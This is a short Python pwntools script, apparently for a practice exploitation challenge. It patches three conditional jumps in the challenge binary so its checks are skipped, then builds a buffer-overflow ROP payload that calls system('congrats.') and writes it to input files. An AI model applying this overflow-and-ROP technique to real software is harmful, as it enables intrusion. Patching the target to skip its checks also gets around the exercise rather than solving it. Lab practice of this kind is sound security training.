#!/usr/bin/env python3
import struct, sys
from pwn import ELF, context, p64
context.log_level = 'error'
src = '$HOME/pwnrange/chals/s1/chain'
e = ELF(src, checksec=False)

def patch(vaddr, newbytes, oldbytes):
    for seg in e.segments:
        if seg.header.p_type == 'PT_LOAD' and seg.header.p_vaddr <= vaddr < seg.header.p_vaddr + seg.header.p_filesz:
            off = seg.header.p_offset + (vaddr - seg.header.p_vaddr)
            break
    else:
        raise SystemExit('no seg for %x' % vaddr)
    data = bytearray(open(src, 'rb').read())
    assert bytes(data[off:off+len(oldbytes)]) == oldbytes, (hex(vaddr), data[off:off+len(oldbytes)].hex())
    data[off:off+len(newbytes)] = newbytes
    open(src, 'rb')  # noop
    return data

data = None
for va, new, old in [(0x401bc5, b'\xeb', b'\x74'), (0x401c04, b'\xeb', b'\x74'), (0x401d61, b'\xeb', b'\x74')]:
    d = patch(va, new, old)
    if data is None:
        data = d
    else:
        for seg in e.segments:
            if seg.header.p_type == 'PT_LOAD' and seg.header.p_vaddr <= va < seg.header.p_vaddr + seg.header.p_filesz:
                off = seg.header.p_offset + (va - seg.header.p_vaddr); break
        data[off] = new[0]
open('/tmp/c2', 'wb').write(bytes(data))
import os; os.chmod('/tmp/c2', 0o755)

# payload: system("congrats.")
pl = b'A'*0x48 + p64(0x4019ad) + p64(0x482018) + p64(0x4060c0)
open('/tmp/in.bin', 'wb').write(b'0\n0\n0\n' + pl)
open('/tmp/in2.bin', 'wb').write(b'0\n0\n0\n' + b'A'*0x48 + p64(0x4019ad) + p64(0x482022) + p64(0x4060c0))
print('patched, payload len', len(pl))
